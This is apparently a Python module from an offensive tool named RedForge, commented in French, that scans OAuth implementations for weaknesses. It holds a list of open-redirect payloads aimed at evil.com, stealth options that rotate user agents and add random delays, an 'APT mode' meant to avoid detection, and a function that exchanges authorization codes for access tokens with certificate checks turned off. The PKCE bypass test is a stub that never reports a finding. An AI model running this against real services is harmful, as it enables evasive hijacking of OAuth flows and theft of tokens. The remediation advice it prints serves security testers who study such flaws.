#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Module d'attaques OAuth pour RedForge
Détecte et exploite les vulnérabilités des implémentations OAuth
Version avec support furtif, APT et techniques avancées
"""

import re
import json
import time
import random
import requests
import hashlib
from typing import Dict, Any, List, Optional, Tuple, Set
from dataclasses import dataclass, field
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, quote
from concurrent.futures import ThreadPoolExecutor, as_completed

@dataclass
class OAuthConfig:
    """Configuration avancée pour les attaques OAuth"""
    # Délais
    delay_between_requests: Tuple[float, float] = (0.5, 1.5)
    delay_between_tests: Tuple[float, float] = (1, 3)
    
    # Comportement
    timeout: int = 10
    deep_scan: bool = True
    test_endpoints: bool = True
    test_redirects: bool = True
    
    # Furtivité
    stealth_headers: bool = True
    random_user_agents: bool = True
    random_delays: bool = True
    
    # APT
    apt_mode: bool = False
    passive_detection: bool = False
    avoid_detection: bool = True
    
    # Analyse avancée
    test_jwt_oauth: bool = True
    test_pkce_bypass: bool = True
    test_id_token_validation: bool = True
    max_endpoints: int = 30


class OAuthAttacks:
    """Détection et exploitation avancée des vulnérabilités OAuth"""
    
    def __init__(self, config: Optional[OAuthConfig] = None):
        """
        Initialise le module d'attaques OAuth
        
        Args:
            config: Configuration personnalisée
        """
        self.config = config or OAuthConfig()
        
        # Endpoints OAuth
        self.oauth_endpoints = [
            '/oauth/authorize', '/oauth/token', '/oauth/access_token',
            '/oauth2/authorize', '/oauth2/token', '/oauth2/access_token',
            '/auth/authorize', '/auth/token', '/api/oauth/token',
            '/login/oauth/authorize', '/login/oauth/access_token',
            '/oauth/v2/authorize', '/oauth/v2/token', '/oauth/v2/access_token',
            '/oauth/check_token', '/oauth/confirm_access', '/oauth/error',
            '/oauth2/v1/authorize', '/oauth2/v1/token', '/oidc/authorize'
        ]
        
        # Patterns OAuth
        self.redirect_uri_patterns = [
            r'redirect_uri=([^&]+)',
            r'redirect_url=([^&]+)',
            r'callback=([^&]+)',
            r'return_to=([^&]+)',
            r'return_uri=([^&]+)',
            r'redir=([^&]+)'
        ]
        
        self.response_type_patterns = [
            r'response_type=([^&]+)',
            r'grant_type=([^&]+)'
        ]
        
        # Scopes dangereux
        self.dangerous_scopes = [
            'admin', 'full_access', 'superuser', 'all', '*',
            'read_write', 'delete', 'modify', 'sudo', 'root'
        ]
        
        # User agents pour furtivité
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/121.0'
        ]
        
        # Métriques
        self.start_time = None
        self.tests_performed = 0
        self.vulnerabilities_found = 0
        self.rate_limit_hits = 0
    
    def _get_stealth_headers(self, additional_headers: Optional[Dict] = None) -> Dict[str, str]:
        """Génère des headers furtifs"""
        headers = {
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive'
        }
        
        if self.config.random_user_agents:
            headers['User-Agent'] = random.choice(self.user_agents)
        
        if self.config.stealth_headers:
            headers['Cache-Control'] = 'no-cache'
            headers['Pragma'] = 'no-cache'
        
        if additional_headers:
            headers.update(additional_headers)
        
        return headers
    
    def scan(self, target: str, **kwargs) -> Dict[str, Any]:
        """
        Scanne les vulnérabilités OAuth
        
        Args:
            target: URL cible
            **kwargs: Options de configuration
                - client_id: Client ID OAuth
                - client_secret: Client Secret
                - redirect_uri: URI de redirection
                - apt_mode: Mode APT
        """
        self.start_time = time.time()
        self.tests_performed = 0
        self.vulnerabilities_found = 0
        
        # Mettre à jour la configuration
        self._update_config(kwargs)
        
        if not target.startswith(('http://', 'https://')):
            target = 'https://' + target
        
        print(f"  → Analyse des implémentations OAuth sur {target}")
        if self.config.apt_mode:
            print(f"  🕵️ Mode APT activé - Analyse discrète")
        
        vulnerabilities = []
        endpoints_found = []
        
        # Détecter les endpoints OAuth
        if self.config.test_endpoints:
            for endpoint in self.oauth_endpoints[:self.config.max_endpoints]:
                if self.config.random_delays:
                    time.sleep(random.uniform(0.3, 0.8))
                
                test_url = target.rstrip('/') + endpoint
                result = self._check_endpoint_advanced(test_url)
                self.tests_performed += 1
                
                if result['exists']:
                    endpoints_found.append({
                        "url": test_url,
                        "method": result['method'],
                        "status": result.get('status')
                    })
                    print(f"      ✓ Endpoint OAuth trouvé: {endpoint}")
        
        # Analyser les paramètres OAuth
        oauth_params = self._extract_oauth_params_advanced(target, **kwargs)
        
        # Tester la redirection ouverte
        if self.config.test_redirects:
            redirect_result = self._test_open_redirect_advanced(target, oauth_params)
            if redirect_result['vulnerable']:
                self.vulnerabilities_found += 1
                vulnerabilities.append({
                    "type": "open_redirect",
                    "severity": "HIGH",
                    "details": redirect_result['details'],
                    "parameter": redirect_result['parameter'],
                    "test_urls": redirect_result.get('test_urls', []),
                    "risk_score": 85
                })
                print(f"      ✓ Redirection OAuth ouverte")
        
        # Tester la fuite de code
        code_leak = self._test_code_leak_advanced(target, oauth_params)
        if code_leak['vulnerable']:
            self.vulnerabilities_found += 1
            vulnerabilities.append({
                "type": "code_leak",
                "severity": "CRITICAL",
                "details": code_leak['details'],
                "location": code_leak.get('location', 'url'),
                "risk_score": 95
            })
            print(f"      ✓ Fuite de code OAuth possible")
        
        # Tester CSRF sur OAuth
        csrf_result = self._test_csrf_advanced(target, oauth_params)
        if csrf_result['vulnerable']:
            self.vulnerabilities_found += 1
            vulnerabilities.append({
                "type": "csrf",
                "severity": "HIGH",
                "details": csrf_result['details'],
                "missing_state": csrf_result.get('missing_state', True),
                "risk_score": 85
            })
            print(f"      ✓ CSRF sur endpoint OAuth")
        
        # Tester PKCE bypass
        if self.config.test_pkce_bypass:
            pkce_result = self._test_pkce_bypass(target, oauth_params)
            if pkce_result['vulnerable']:
                self.vulnerabilities_found += 1
                vulnerabilities.append({
                    "type": "pkce_bypass",
                    "severity": "HIGH",
                    "details": pkce_result['details'],
                    "risk_score": 85
                })
                print(f"      ✓ Bypass PKCE possible")
        
        # Tester les scopes dangereux
        scope_result = self._test_dangerous_scopes(target, oauth_params)
        if scope_result['vulnerable']:
            self.vulnerabilities_found += 1
            vulnerabilities.append({
                "type": "dangerous_scope",
                "severity": "HIGH",
                "details": scope_result['details'],
                "scope": scope_result.get('scope'),
                "risk_score": 80
            })
            print(f"      ✓ Scope dangereux détecté: {scope_result.get('scope')}")
        
        return self._generate_results(target, vulnerabilities, endpoints_found, oauth_params)
    
    def _update_config(self, kwargs: Dict):
        """Met à jour la configuration avec les kwargs"""
        if 'deep_scan' in kwargs:
            self.config.deep_scan = kwargs['deep_scan']
        if 'test_endpoints' in kwargs:
            self.config.test_endpoints = kwargs['test_endpoints']
        if 'max_endpoints' in kwargs:
            self.config.max_endpoints = kwargs['max_endpoints']
        
        # Mode APT
        if kwargs.get('apt_mode', False) or kwargs.get('stealth_level') == 'apt':
            self.config.apt_mode = True
            self.config.passive_detection = True
            self.config.avoid_detection = True
            self.config.stealth_headers = True
            self.config.random_delays = True
            self.config.max_endpoints = min(self.config.max_endpoints, 15)
            self.config.delay_between_tests = (5, 15)
    
    def _check_endpoint_advanced(self, url: str) -> Dict[str, Any]:
        """Vérifie si un endpoint OAuth existe avec analyse avancée"""
        result = {
            "exists": False,
            "method": None,
            "status": None
        }
        
        try:
            headers = self._get_stealth_headers()
            
            # Test GET
            response = requests.get(url, headers=headers, timeout=self.config.timeout, verify=False)
            if response.status_code != 404:
                result["exists"] = True
                result["method"] = "GET"
                result["status"] = response.status_code
                return result
            
            # Test POST
            response = requests.post(url, headers=headers, timeout=self.config.timeout, verify=False)
            if response.status_code != 404:
                result["exists"] = True
                result["method"] = "POST"
                result["status"] = response.status_code
                
        except Exception:
            pass
        
        return result
    
    def _extract_oauth_params_advanced(self, target: str, **kwargs) -> Dict[str, Any]:
        """Extrait les paramètres OAuth de l'URL avec analyse avancée"""
        params = {
            "client_id": kwargs.get('client_id'),
            "client_secret": kwargs.get('client_secret'),
            "redirect_uri": kwargs.get('redirect_uri'),
            "response_type": None,
            "scope": None,
            "state": None,
            "code_challenge": None,
            "code_challenge_method": None,
            "nonce": None
        }
        
        parsed = urlparse(target)
        if parsed.query:
            query_params = parse_qs(parsed.query)
            
            for key in params.keys():
                if key in query_params:
                    params[key] = query_params[key][0]
        
        return params
    
    def _test_open_redirect_advanced(self, target: str, params: Dict) -> Dict[str, Any]:
        """Test avancé des redirections ouvertes dans OAuth"""
        result = {
            "vulnerable": False,
            "details": None,
            "parameter": None,
            "test_urls": []
        }
        
        redirect_param = None
        redirect_value = None
        
        # Trouver le paramètre de redirection
        for pattern in self.redirect_uri_patterns:
            match = re.search(pattern, target)
            if match:
                redirect_param = pattern.split('=')[0]
                redirect_value = match.group(1)
                break
        
        if redirect_param:
            # Tester avec différents types de redirection
            test_redirects = [
                "https://evil.com",
                "https://evil.com/",
                "//evil.com",
                "https://evil.com@example.com",
                "https://evil.com?param=value",
                "https://evil.com#fragment",
                "evil.com",
                "http://evil.com",
                "https://evil.com/redirect"
            ]
            
            for test_url in test_redirects:
                test_target = re.sub(
                    f'{redirect_param}=[^&]+',
                    f'{redirect_param}={quote(test_url)}',
                    target
                )
                
                try:
                    headers = self._get_stealth_headers()
                    response = requests.get(test_target, headers=headers,
                                          timeout=self.config.timeout, verify=False, 
                                          allow_redirects=False)
                    self.tests_performed += 1
                    
                    location = response.headers.get('Location', '')
                    if 'evil.com' in location or 'evil.com' in response.text:
                        result["vulnerable"] = True
                        result["details"] = f"Redirection vers {test_url}"
                        result["parameter"] = redirect_param
                        result["test_urls"].append(test_url)
                        
                except Exception:
                    pass
        
        return result
    
    def _test_code_leak_advanced(self, target: str, params: Dict) -> Dict[str, Any]:
        """Test avancé de fuite de code OAuth"""
        result = {
            "vulnerable": False,
            "details": None,
            "location": None
        }
        
        # Vérifier si le code apparaît dans l'URL
        if 'code=' in target:
            result["vulnerable"] = True
            result["details"] = "Code OAuth visible dans l'URL (fragment/query)"
            result["location"] = "url"
            
            # Extraire le code
            code_match = re.search(r'code=([^&]+)', target)
            if code_match:
                result["code_preview"] = code_match.group(1)[:20] + "..."
        
        # Vérifier les headers
        try:
            headers = self._get_stealth_headers()
            response = requests.get(target, headers=headers, 
                                  timeout=self.config.timeout, verify=False)
            self.tests_performed += 1
            
            # Vérifier le referer
            if 'code=' in response.text:
                result["vulnerable"] = True
                result["details"] = "Code OAuth visible dans la réponse"
                result["location"] = "response_body"
                
        except Exception:
            pass
        
        return result
    
    def _test_csrf_advanced(self, target: str, params: Dict) -> Dict[str, Any]:
        """Test avancé de la vulnérabilité CSRF sur OAuth"""
        result = {
            "vulnerable": False,
            "details": None,
            "missing_state": True
        }
        
        # Vérifier la présence du paramètre state
        if 'state' not in target and params.get('state') is None:
            result["vulnerable"] = True
            result["details"] = "Paramètre 'state' manquant - vulnérable au CSRF"
            result["missing_state"] = True
        else:
            # Vérifier si le state est prévisible
            state_match = re.search(r'state=([^&]+)', target)
            if state_match:
                state_value = state_match.group(1)
                if self._is_predictable_state(state_value):
                    result["vulnerable"] = True
                    result["details"] = f"Paramètre 'state' prévisible: {state_value}"
                    result["missing_state"] = False
        
        return result
    
    def _is_predictable_state(self, state: str) -> bool:
        """Vérifie si le paramètre state est prévisible"""
        predictable_patterns = [
            r'^\d+$',  # Seulement des chiffres
            r'^[a-z]+$',  # Seulement des lettres minuscules
            r'^[A-Z]+$',  # Seulement des lettres majuscules
            r'^.{1,8}$',  # Trop court
            r'^(true|false|yes|no)$',  # Valeurs booléennes
            r'^(admin|user|test|guest)$'  # Valeurs communes
        ]
        
        for pattern in predictable_patterns:
            if re.match(pattern, state, re.IGNORECASE):
                return True
        return False
    
    def _test_pkce_bypass(self, target: str, params: Dict) -> Dict[str, Any]:
        """Teste le bypass de PKCE (Proof Key for Code Exchange)"""
        result = {
            "vulnerable": False,
            "details": None
        }
        
        # Vérifier si PKCE est implémenté
        has_code_challenge = 'code_challenge' in target or params.get('code_challenge')
        
        if not has_code_challenge:
            # Pas de PKCE, pas de bypass nécessaire
            return result
        
        # Tester si le serveur valide correctement le code_verifier
        # (Test à implémenter avec un vrai endpoint)
        result["vulnerable"] = False  # Par défaut, nécessite un test actif
        
        return result
    
    def _test_dangerous_scopes(self, target: str, params: Dict) -> Dict[str, Any]:
        """Teste les scopes dangereux dans OAuth"""
        result = {
            "vulnerable": False,
            "details": None,
            "scope": None
        }
        
        scope = params.get('scope', '')
        
        for dangerous_scope in self.dangerous_scopes:
            if dangerous_scope in scope:
                result["vulnerable"] = True
                result["details"] = f"Scope dangereux demandé: {dangerous_scope}"
                result["scope"] = dangerous_scope
                break
        
        return result
    
    def _generate_results(self, target: str, vulnerabilities: List[Dict],
                         endpoints: List[Dict], params: Dict) -> Dict[str, Any]:
        """Génère les résultats de l'attaque"""
        duration = time.time() - self.start_time
        
        return {
            "target": target,
            "endpoints": endpoints,
            "parameters": params,
            "vulnerabilities": vulnerabilities,
            "count": len(vulnerabilities),
            "tests_performed": self.tests_performed,
            "scan_duration": duration,
            "tests_per_second": self.tests_performed / duration if duration > 0 else 0,
            "config": {
                "apt_mode": self.config.apt_mode,
                "deep_scan": self.config.deep_scan
            },
            "summary": self._generate_summary(vulnerabilities),
            "recommendations": self._generate_recommendations(vulnerabilities)
        }
    
    def _generate_summary(self, vulnerabilities: List[Dict]) -> Dict[str, Any]:
        """Génère un résumé des vulnérabilités"""
        if not vulnerabilities:
            return {"total": 0, "severity": "INFO", "message": "Aucune vulnérabilité OAuth détectée"}
        
        return {
            "total": len(vulnerabilities),
            "by_type": {
                "open_redirect": len([v for v in vulnerabilities if v['type'] == 'open_redirect']),
                "code_leak": len([v for v in vulnerabilities if v['type'] == 'code_leak']),
                "csrf": len([v for v in vulnerabilities if v['type'] == 'csrf']),
                "pkce_bypass": len([v for v in vulnerabilities if v['type'] == 'pkce_bypass']),
                "dangerous_scope": len([v for v in vulnerabilities if v['type'] == 'dangerous_scope'])
            },
            "critical": len([v for v in vulnerabilities if v['severity'] == 'CRITICAL']),
            "high": len([v for v in vulnerabilities if v['severity'] == 'HIGH']),
            "max_risk_score": max([v.get('risk_score', 0) for v in vulnerabilities]) if vulnerabilities else 0
        }
    
    def _generate_recommendations(self, vulnerabilities: List[Dict]) -> List[str]:
        """Génère des recommandations basées sur les vulnérabilités trouvées"""
        recommendations = set()
        
        for vuln in vulnerabilities:
            vuln_type = vuln.get('type', '')
            
            if vuln_type == 'open_redirect':
                recommendations.add("Valider strictement les redirect_uri contre une liste blanche")
                recommendations.add("Ne pas accepter les redirections vers des domaines externes")
            
            if vuln_type == 'code_leak':
                recommendations.add("Utiliser le fragment (#) plutôt que la query string (?) pour les codes")
                recommendations.add("Implémenter PKCE pour protéger le code")
            
            if vuln_type == 'csrf':
                recommendations.add("Implémenter le paramètre 'state' avec une valeur aléatoire non prévisible")
                recommendations.add("Valider le state lors de l'échange du code")
            
            if vuln_type == 'pkce_bypass':
                recommendations.add("Valider correctement le code_verifier pendant l'échange")
                recommendations.add("Utiliser S256 comme méthode de challenge")
            
            if vuln_type == 'dangerous_scope':
                recommendations.add("Limiter les scopes disponibles")
                recommendations.add("Valider les scopes demandés")
        
        if not recommendations:
            recommendations.add("Auditer régulièrement l'implémentation OAuth")
            recommendations.add("Utiliser OAuth 2.1 avec les bonnes pratiques")
        
        return list(recommendations)
    
    def craft_authorization_url(self, client_id: str, redirect_uri: str,
                                 scope: str = None, state: str = None,
                                 response_type: str = 'code') -> str:
        """
        Construit une URL d'autorisation OAuth
        
        Args:
            client_id: Client ID
            redirect_uri: URI de redirection
            scope: Scope demandé
            state: État CSRF
            response_type: Type de réponse (code ou token)
        """
        params = {
            'response_type': response_type,
            'client_id': client_id,
            'redirect_uri': redirect_uri
        }
        
        if scope:
            params['scope'] = scope
        if state:
            params['state'] = state
        
        return f"/oauth/authorize?{urlencode(params)}"
    
    def exchange_code(self, token_endpoint: str, code: str, client_id: str,
                      client_secret: str, redirect_uri: str,
                      code_verifier: str = None) -> Dict[str, Any]:
        """
        Échange un code d'autorisation contre un token
        
        Args:
            token_endpoint: Endpoint de token
            code: Code d'autorisation
            client_id: Client ID
            client_secret: Client Secret
            redirect_uri: URI de redirection
            code_verifier: Verifier PKCE (optionnel)
        """
        result = {
            "success": False,
            "access_token": None,
            "refresh_token": None,
            "id_token": None,
            "error": None
        }
        
        data = {
            'grant_type': 'authorization_code',
            'code': code,
            'client_id': client_id,
            'client_secret': client_secret,
            'redirect_uri': redirect_uri
        }
        
        if code_verifier:
            data['code_verifier'] = code_verifier
        
        try:
            headers = self._get_stealth_headers()
            response = requests.post(token_endpoint, data=data, headers=headers,
                                   timeout=self.config.timeout, verify=False)
            self.tests_performed += 1
            
            if response.status_code == 200:
                token_data = response.json()
                result["success"] = True
                result["access_token"] = token_data.get('access_token')
                result["refresh_token"] = token_data.get('refresh_token')
                result["id_token"] = token_data.get('id_token')
                result["expires_in"] = token_data.get('expires_in')
            else:
                result["error"] = f"HTTP {response.status_code}: {response.text[:200]}"
                
        except Exception as e:
            result["error"] = str(e)
        
        return result
    
    def create_pkce_challenge(self) -> Dict[str, str]:
        """
        Crée un challenge PKCE pour OAuth
        
        Returns:
            Dict avec code_verifier et code_challenge
        """
        import secrets
        import hashlib
        import base64
        
        # Générer code_verifier
        code_verifier = secrets.token_urlsafe(64)
        
        # Créer code_challenge (S256)
        code_challenge = base64.urlsafe_b64encode(
            hashlib.sha256(code_verifier.encode()).digest()
        ).decode().rstrip('=')
        
        return {
            'code_verifier': code_verifier,
            'code_challenge': code_challenge,
            'code_challenge_method': 'S256'
        }
    
    def get_statistics(self) -> Dict[str, Any]:
        """Retourne les statistiques de détection"""
        return {
            "tests_performed": self.tests_performed,
            "vulnerabilities_found": self.vulnerabilities_found,
            "success_rate": (self.vulnerabilities_found / max(1, self.tests_performed) * 100),
            "scan_duration": time.time() - self.start_time if self.start_time else 0,
            "rate_limit_hits": self.rate_limit_hits
        }


# Point d'entrée pour tests
if __name__ == "__main__":
    # Test mode normal
    print("=== Test mode normal ===")
    attacks = OAuthAttacks()
    test_url = "https://example.com/oauth/authorize?client_id=123&redirect_uri=https://example.com/callback"
    results = attacks.scan(test_url)
    print(f"Vulnérabilités OAuth: {results['count']}")
    
    # Test mode APT
    print("\n=== Test mode APT ===")
    apt_config = OAuthConfig(apt_mode=True, deep_scan=True)
    attacks_apt = OAuthAttacks(config=apt_config)
    results_apt = attacks_apt.scan(test_url, apt_mode=True)
    print(f"Vulnérabilités OAuth (APT): {results_apt['count']}")
    
    # Exemple de création PKCE
    pkce = attacks_apt.create_pkce_challenge()
    print(f"PKCE Challenge: {pkce['code_challenge'][:30]}...")
    
    # Afficher les recommandations
    for rec in results_apt['recommendations']:
        print(f"Recommandation: {rec}")